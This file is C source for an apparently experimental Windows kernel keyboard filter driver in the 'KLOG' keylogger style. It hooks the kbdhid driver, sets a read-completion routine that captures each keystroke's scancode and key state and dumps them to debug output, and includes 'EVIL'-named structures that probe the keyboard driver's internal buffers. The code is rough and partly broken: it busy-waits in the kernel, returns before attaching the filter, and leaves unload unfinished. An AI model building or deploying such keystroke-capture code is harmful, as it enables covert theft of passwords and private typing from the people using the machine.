#include <ntddk.h>
#include <wdf.h>
#include <ntddkbd.h>   
#include <Driver.h>   
#include <ControlDevice.h>
#include <scancode.h>
#include <PageTableManipulation.h>

PDEVICE_OBJECT usbBaseKeyboardDeviceObject;
PDEVICE_OBJECT usbKeyboardDeviceObject;
VOID pauseForABit(CSHORT secondsDelay) {

	LARGE_INTEGER systemTime;
	LARGE_INTEGER currentTime;
	TIME_FIELDS formattedTime;

	KeQuerySystemTime(&systemTime);
	ExSystemTimeToLocalTime(&systemTime, &currentTime);
	RtlTimeToTimeFields(&currentTime, &formattedTime);
	CSHORT ExitMinute = formattedTime.Minute;
	CSHORT ExitSecond = formattedTime.Second + secondsDelay;
	while (ExitSecond > 59) {
		ExitSecond = ExitSecond - 60;
		ExitMinute = ExitMinute + 1;
	}
	while (ExitMinute > 59) {
		ExitMinute = ExitMinute - 60;
	}
	CSHORT CurrentMinute = formattedTime.Minute;
	CSHORT CurrentSecond = formattedTime.Second;

	KdPrint(("%d seconds pause begin [%d:%d]", secondsDelay, CurrentMinute, CurrentSecond));

	while (TRUE) {
		KeQuerySystemTime(&systemTime);
		ExSystemTimeToLocalTime(&systemTime, &currentTime);
		RtlTimeToTimeFields(&currentTime, &formattedTime);
		CurrentMinute = formattedTime.Minute;
		CurrentSecond = formattedTime.Second;
		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
			break;
		}
	}
	KdPrint((" - [%d:%d]\n", CurrentMinute, CurrentSecond));
	return;
}



#define RAMSTR "System RAM"

DRIVER_INITIALIZE DriverEntry;
int numPendingIrps = 0;
PEVIL_LOOK queryPvoid = NULL;
PULONG keyboardBuffer = NULL;
PFILE_OBJECT keyboardBufferFileObject = NULL;

_Use_decl_annotations_
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	//KdPrint(("OnReadCompletion IRQ Level [%u]\n", KeGetCurrentIrql()));

	UNREFERENCED_PARAMETER(Context);
	PKEYBOARD_INPUT_DATA keys;
	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension;

	//get the device extension - we'll need to use it later   
	pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	//if the request has completed, extract the value of the key  
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

		//if (!keyboardBuffer) {
		//	keyboardBuffer = keys;
		//}

		// PVOID userBuffer = pIrp->UserBuffer;
		if (!keyboardBufferFileObject) {
			PFILE_OBJECT fileObject = pIrp->Tail.Overlay.OriginalFileObject;
			keyboardBufferFileObject = fileObject;
		}
		if (MmIsAddressValid(keys)) {
			if (queryPvoid) {
				if (MmIsAddressValid(queryPvoid)) {

					PUSHORT pflag = &(keys->Flags);
					PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
					PUSHORT make = &(keys->MakeCode);
					PHYSICAL_ADDRESS makePA = MmGetPhysicalAddress(make);
					KdPrint(("ScanCode: %s%x %c %s make [%s0x%x|0x%lx|0x%lx] queryPvoid [0x%lx]: [0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx]\n", 
						keys->MakeCode > 0xf ? "" : " ", keys->MakeCode, KeyMap[keys->MakeCode],
						keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
						keys->MakeCode > 0xf ? "" : " ", *make, make, makePA,
						queryPvoid,
						queryPvoid->data0, queryPvoid->data1, queryPvoid->data2, queryPvoid->data3, queryPvoid->data4, queryPvoid->data5, queryPvoid->data6, queryPvoid->data7, 
						queryPvoid->data8, queryPvoid->data9, queryPvoid->data10, queryPvoid->data11, queryPvoid->data12, queryPvoid->data13, queryPvoid->data14, queryPvoid->data15, 
						queryPvoid->data16, queryPvoid->data17, queryPvoid->data18, queryPvoid->data19, queryPvoid->data20, queryPvoid->data21, queryPvoid->data22, queryPvoid->data23,
						queryPvoid->data24, queryPvoid->data25, queryPvoid->data26, queryPvoid->data27, queryPvoid->data28, queryPvoid->data29, queryPvoid->data30, queryPvoid->data31
						));


				}
				else {
					if (keys->Flags == KEY_MAKE) {
						PUSHORT pflag = &(keys->Flags);
						PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
						PUSHORT make = &(keys->MakeCode);
						PHYSICAL_ADDRESS makePA = MmGetPhysicalAddress(make);
						KdPrint(("ScanCode: %x %c %s make [0x%x|0x%lx|0x%lx] queryPvoid [0x%lx] is invalid\n",
							keys->MakeCode,
							KeyMap[keys->MakeCode],
							keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
							*make, make, makePA, queryPvoid));
					}
				}
			}
			else {


				if (keys->Flags == KEY_MAKE) {
					PUSHORT pflag = &(keys->Flags);
					PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
					PUSHORT make = &(keys->MakeCode);
					PHYSICAL_ADDRESS makePA = MmGetPhysicalAddress(make);
					KdPrint(("ScanCode: %x %c %s uid[0x%x]res[0x%x]xtra[0x%lx]  make [0x%x] [0x%lx] [0x%lx] flag [0x%x] [0x%lx] [0x%lx]\n",
						keys->MakeCode,
						KeyMap[keys->MakeCode],
						keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
						keys->UnitId, keys->Reserved, keys->ExtraInformation
						, *make, make, makePA, *pflag, pflag, flagPA));
				}
			}
		}
	}//end if  
	/**/

	//Mark the Irp pending if necessary   
	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
	}
	//Remove the Irp from our own count of tagged (pending) IRPs   
	numPendingIrps--;

	return pIrp->IoStatus.Status;
}//end OnReadCompletion   
/**/

_Use_decl_annotations_
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	//KdPrint(("DispathcRead IRQ Level [%u]\n", KeGetCurrentIrql())); 
	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	//Set the completion callback   
	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	//track the # of pending IRPs   
	numPendingIrps++;

	//Pass the IRP on down to the driver underneath us   
	return IoCallDriver(((PKLOG_DEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

}//end DispatchRead   
/**/

_Use_decl_annotations_
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{

	KdPrint(("HookKeyboard IRQ Level [%u]\n", KeGetCurrentIrql()));
	//the filter device object   
	NTSTATUS status;
	//extern POBJECT_TYPE  *IoDriverObjectType;
	POBJECT_TYPE driverObjectType;
	PDRIVER_OBJECT kbdClassDriverObject;
	UNICODE_STRING kbdClassDriverName;

	//PDEVICE_OBJECT usbKeyboardDeviceObject;
	PDEVICE_OBJECT pKeyboardDeviceObject;

	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension;

	//Create a keyboard device object   // KLOG_DEVICE_EXTENSION
	status = IoCreateDevice(pDriverObject, sizeof(KLOG_DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);
	if (!NT_SUCCESS(status))   //Make sure the device was created ok   
		return status;
	KdPrint(("Created keyboard device successfully...\n"));
	KdPrint(("pKeyboardDeviceObject is: [0x%llx]\n", pKeyboardDeviceObject));

	// Set the Flags
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	KdPrint(("Flags set succesfully...\n"));

	// Zero out the device extension  
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(KLOG_DEVICE_EXTENSION));
	KdPrint(("Device Extension Initialized...\n"));
	pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	// Now go and get the kbdclass driver
	//RtlInitUnicodeString(&kbdClassDriverName, L"\\Driver\\kbdclass");
	RtlInitUnicodeString(&kbdClassDriverName, L"\\Driver\\kbdhid");
	// TODO: try grabbing kbdhid instead.....
	driverObjectType = ObGetObjectType(pDriverObject);
	status = ObReferenceObjectByName(&kbdClassDriverName, OBJ_CASE_INSENSITIVE,NULL,0,driverObjectType, //(POBJECT_TYPE)IoDriverObjectType,
	KernelMode,NULL,(PVOID*)&kbdClassDriverObject);

	if (NT_SUCCESS(status)) {
		KdPrint(("kbdClassDriverObject is [0x%lx]\n", kbdClassDriverObject));

		pauseForABit(10);

		//usbKeyboardDeviceObject = kbdClassDriverObject->DeviceObject; 
		usbBaseKeyboardDeviceObject = kbdClassDriverObject->DeviceObject;
		if (usbBaseKeyboardDeviceObject) {
			KdPrint(("usbBaseKeyboardDeviceObject is [0x%lx]\n", usbBaseKeyboardDeviceObject));
			pauseForABit(10);
			PUSBK_EXT usbBaseDeviceExtension = (PUSBK_EXT)usbBaseKeyboardDeviceObject->DeviceExtension;
			KdPrint(("usbBaseDeviceExtension is [0x%lx]\n", usbBaseDeviceExtension));
			pauseForABit(10);
			PUSBK_DATA dataPointer = usbBaseDeviceExtension->dataPointer;
			ULONG buffer = dataPointer->buffer;
			PULONG bufferAddress = &dataPointer->buffer;
			KdPrint(("bufferAddress is [0x%lx]\n", bufferAddress));
			pauseForABit(10);
			keyboardBuffer = bufferAddress;
			/**/
			return status;
		}
		usbKeyboardDeviceObject = usbBaseKeyboardDeviceObject->NextDevice;

		// TODO: figure out do to determine is this keyboard IS a USB one
		if (usbKeyboardDeviceObject) {
			PHID_KBD usbDeviceExtension = usbKeyboardDeviceObject->DeviceExtension;

			PDEVOBJ_EXTENSION usbObjectExtension = usbKeyboardDeviceObject->DeviceObjectExtension;

			

			KdPrint(("size of PVOID                is: [%d]\n", sizeof(PVOID)));
			KdPrint(("size of LIST_ENTRY           is: [%d]\n", sizeof(LIST_ENTRY)));
			KdPrint(("size of WAIT_CONTEXT_BLOCK   is: [%d]\n", sizeof(WAIT_CONTEXT_BLOCK)));
			KdPrint(("size of KDEVICE_QUEUE        is: [%d]\n", sizeof(KDEVICE_QUEUE)));
			KdPrint(("size of KDPC                 is: [%d]\n", sizeof(KDPC)));
			KdPrint(("size of PSECURITY_DESCRIPTOR is: [%d]\n", sizeof(PSECURITY_DESCRIPTOR)));
			KdPrint(("size of KEVENT               is: [%d]\n", sizeof(KEVENT)));





			KdPrint(("\npKeyboardDeviceObject is: [0x%lx] [0x%lx]\n", pKeyboardDeviceObject, MmGetPhysicalAddress(pKeyboardDeviceObject)));
			KdPrint(("usbKeyboardDeviceObject is: [0x%lx] [0x%lx]\n", usbKeyboardDeviceObject, MmGetPhysicalAddress(usbKeyboardDeviceObject)));
			KdPrint(("usbObjectExtension is: [0x%lx] [0x%lx]\n", usbObjectExtension, MmGetPhysicalAddress(usbObjectExtension)));
			KdPrint(("usbDeviceExtension is: [0x%lx] [0x%lx]\n", usbDeviceExtension, MmGetPhysicalAddress(usbDeviceExtension)));
			KdPrint(("usbDeviceExtension pHidFuncs is: [0x%lx] [0x%lx]\n", usbDeviceExtension->pHidFuncs, MmGetPhysicalAddress(usbDeviceExtension->pHidFuncs)));
			KdPrint(("phidpPreparsedData phidpPreparsedData is: [0x%lx] [0x%lx]\n", usbDeviceExtension->phidpPreparsedData, MmGetPhysicalAddress(usbDeviceExtension->phidpPreparsedData)));
			KdPrint(("usbDeviceExtension pbOutputBuffer is: [0x%lx] [0x%lx]\n\n", usbDeviceExtension->pbOutputBuffer, MmGetPhysicalAddress(usbDeviceExtension->pbOutputBuffer)));

			PEVIL_EXTENSION pevil = (PEVIL_EXTENSION)usbDeviceExtension;
			KdPrint(("usbDeviceExtension [0x%lx]: [0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx]\n", pevil
				, pevil->pointer0, pevil->pointer1, pevil->pointer2, pevil->pointer3, pevil->pointer4, pevil->pointer5, pevil->pointer6, pevil->pointer7, pevil->pointer8, pevil->pointer9
				, pevil->pointer10, pevil->pointer11, pevil->pointer12, pevil->pointer13, pevil->pointer14, pevil->pointer15, pevil->pointer16, pevil->pointer17
				));


			//DeviceObjectExtension
		}
		else {
			KdPrint(("usbKeyboardDeviceObject is NULL\n"));
		}
		KdPrint(("about to attach to device stack safe\n"));

		status = IoAttachDeviceToDeviceStackSafe(pKeyboardDeviceObject, usbKeyboardDeviceObject, &pKeyboardDeviceExtension->pKeyboardDevice);

		if (!NT_SUCCESS(status))   { //Make sure the device was created ok
			KdPrint(("Filter Device Attachment FAILED 0x%lx\n", status));
		}
		else {
			KdPrint(("Filter Device Attached\n"));
		}
	}
	else {
		KdPrint(("Failed to get driver pointer  [0x%lx]\n", status));
	}
	return status;
}//end HookKeyboard   

_Use_decl_annotations_
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	//UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KmdfHelloWorld: DriverEntry\n"));
	KdPrint(("DriverEntry IRQ Level [%u]", KeGetCurrentIrql()));
	//Explicitly fill in the IRP's we want to hook  
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = DispatchPassDown;
	}
	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	status = HookKeyboard(DriverObject);
	KdPrint(("Hooked IRP_MJ_READ routine...\n"));

	// Set the DriverUnload procedure   
	KdPrint(("Set DriverUnload function pointer...\n"));
	DriverObject->DriverUnload = Unload;

	KdPrint(("Creating Control Device...\n"));
	status = CreateControlDevice( DriverObject,  RegistryPath);

	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	KdPrint(("Exiting Driver Entry......\n"));

	return status;
}

_Use_decl_annotations_
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	//pass the irp down to the target without touching it   
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PKLOG_DEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}//end DriverDispatcher   

 
_Use_decl_annotations_
VOID Unload(IN PDRIVER_OBJECT pDriverObject)
{
	KdPrint(("Unload IRQ Level [%u]", KeGetCurrentIrql()));
	
	// TODO: need to implement this



	KdPrint(("Removing Control Device...\n"));
	//RemoveControlDevice(pDriverObject);

	KdPrint(("Unhooking Keyboard...\n"));
	//UnhookKeyboard(pDriverObject);

	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");

	IoDeleteDevice(pDriverObject->DeviceObject);

	return;
}



